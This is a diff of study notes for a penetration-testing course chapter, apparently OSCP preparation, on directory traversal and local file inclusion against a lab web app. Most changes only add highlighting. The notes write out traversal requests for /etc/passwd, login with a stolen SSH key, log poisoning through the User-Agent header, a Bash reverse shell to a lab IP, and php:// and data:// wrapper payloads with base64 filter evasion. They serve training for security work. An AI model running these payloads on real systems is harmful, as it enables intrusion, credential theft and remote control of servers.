@@ -178,7 +178,7 @@ The chapter adds the target hostname to `/etc/hosts`:
 
 - **File:** `/etc/hosts`
 - **Purpose:** Local hostname-to-IP mapping when the lab application expects a specific hostname / virtual host.
-- **OSCP use:** If browsing by IP does not return the expected site, inspect redirects, certificates, page content, and virtual-host clues; then add the hostname to `/etc/hosts`.
+- ==**OSCP use:** If browsing by IP does not return the expected site, inspect redirects, certificates, page content, and virtual-host clues; then add the hostname to `/etc/hosts`.==
 
 ### Vulnerable parameter
 
@@ -188,7 +188,7 @@ The application exposes:
 http://mountaindesserts.com/meteor/index.php?page=admin.php
 ```
 
-The `page` parameter appears to include `admin.php` into `index.php`. A traversal test replaces `admin.php` with a path to `/etc/passwd`:
+==The `page` parameter appears to include `admin.php` into `index.php`. A traversal test replaces `admin.php` with a path to `/etc/passwd`:==
 
 ```text
 http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
@@ -223,7 +223,7 @@ curl 'http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../
 
 ### Using a stolen SSH key
 
-Save the returned key as `dt_key`, then:
+==Save the returned key as `dt_key`, then:==
 
 ```bash
 ssh -i dt_key -p 2222 offsec@mountaindesserts.com
@@ -284,6 +284,14 @@ Some Windows-hosted applications normalize one style but not the other.
 
 Filters often look for literal malicious sequences such as `../`. URL/percent encoding can change the representation seen by a naïve filter while the server later decodes the value.
 
+==To find URL encoding,== we can use python code like this:
+
+```
+from urllib.parse import quote
+
+print(quote("/", safe=""))   # %2F
+```
+
 For Apache 2.4.49 (the chapter’s example), plain traversal attempts fail:
 
 ```bash
@@ -324,7 +332,7 @@ For an executable server-side file such as PHP, inclusion may execute the code i
 
 ### Key idea
 
-An LFI allows inclusion of a file already present on the target. To turn LFI into code execution, you need a local file that contains code you control. The chapter demonstrates **log poisoning**:
+An LFI allows inclusion of a file already present on the target. ==To turn LFI into code execution, you need a local file that contains code you control.== The chapter demonstrates **log poisoning**:
 
 1. Find an includable log file.
 2. Identify a field you can control that gets written into the log.
@@ -349,9 +357,16 @@ Workflow:
 1. Browse the vulnerable page through Burp.
 2. Locate the request under **HTTP history**.
 3. Send it to **Repeater**.
-4. Modify the `User-Agent` header.
+4. ==Modify the `User-Agent` header.==
 5. Send the request to write the payload into `access.log`.
 6. Change the vulnerable `page` parameter so the app includes `access.log`.
+
+You can modify your agent browser using curl also:
+```
+curl -A "Mozilla Browser" http://target/
+or, put command
+curl -A "hello-test" http://target/
+```
 
 ### PHP code written into the log
 
@@ -369,7 +384,7 @@ The log file path used by the LFI is:
 ../../../../../../../../../var/log/apache2/access.log
 ```
 
-Then add a second URL parameter, for example:
+==Then add a second URL parameter, for example:==
 
 ```text
 &cmd=ps
@@ -384,7 +399,7 @@ The chapter then tests:
 cmd=ls -la
 ```
 
-A literal space causes trouble, so the space is encoded:
+==A literal space causes trouble, so the space is encoded:==
 
 ```text
 cmd=ls%20-la
@@ -392,9 +407,9 @@ cmd=ls%20-la
 
 - `%20` = space.
 
-### From command execution to reverse shell
+### ==From command execution to reverse shell==
 
-Basic Bash TCP reverse shell:
+==Basic Bash TCP reverse shell:==
 
 ```bash
 bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
@@ -411,7 +426,7 @@ bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
 - **`>& /dev/tcp/IP/PORT`:** Redirect output to a TCP connection.
 - **`0>&1`:** Redirect stdin to the same connection.
 
-URL-encoded version from the chapter:
+==URL-encoded version from the chapter:==
 
 ```text
 bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
@@ -461,9 +476,9 @@ Normal inclusion:
 curl 'http://mountaindesserts.com/meteor/index.php?page=admin.php'
 ```
 
-If this is LFI, PHP code is executed server-side, so you may see only rendered output rather than source.
+==If this is LFI, PHP code is executed server-side, so you may see only rendered output rather than source.==
 
-Try the wrapper without a transform:
+==Try the wrapper without a transform:==
 
 ```bash
 curl 'http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php'
@@ -492,7 +507,7 @@ echo '<BASE64_DATA>' | base64 -d
 
 The chapter’s decoded `admin.php` reveals **MySQL connection credentials**. This is an important OSCP pivot: source disclosure often produces reusable passwords or database credentials.
 
-### `data://` — execute embedded PHP
+### ==`data://` — execute embedded PHP==
 
 Plain-text data wrapper example:
 
@@ -504,7 +519,7 @@ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%
 - Embedded PHP calls `system('ls')`.
 - `%20` encodes spaces.
 
-If filters block words like `system`, Base64-encode the PHP first:
+==If filters block words like `system`, Base64-encode the PHP first:==
 
 ```bash
 echo -n '<?php echo system($_GET["cmd"]);?>' | base64
